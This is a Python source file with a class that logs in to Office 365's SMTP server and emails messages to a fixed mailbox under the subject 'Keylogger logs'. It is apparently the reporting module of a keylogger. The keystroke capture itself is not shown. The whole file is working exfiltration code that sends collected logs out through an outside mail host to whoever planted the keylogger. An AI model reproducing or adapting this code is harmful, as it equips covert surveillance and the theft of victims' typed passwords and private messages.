import smtplib

from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class EmailReporting:
    email_address = ""
    password = ""

    def __init__(self, email_address, password) -> None:
        self.email_address = email_address
        self.password = password

    def prepare_mail(self, message):

        msg = MIMEMultipart("alternative")
        msg["From"] = self.email_address
        msg["To"] = self.email_address
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    def report(self, message, verbose=1):
        # manages a connection to an SMTP server
        # setup for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)

        server.starttls()

        server.login(self.email_address, self.password)

        server.sendmail(self.email_address, self.email_address, self.prepare_mail(message))

        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {self.email_address} containing:  {message}")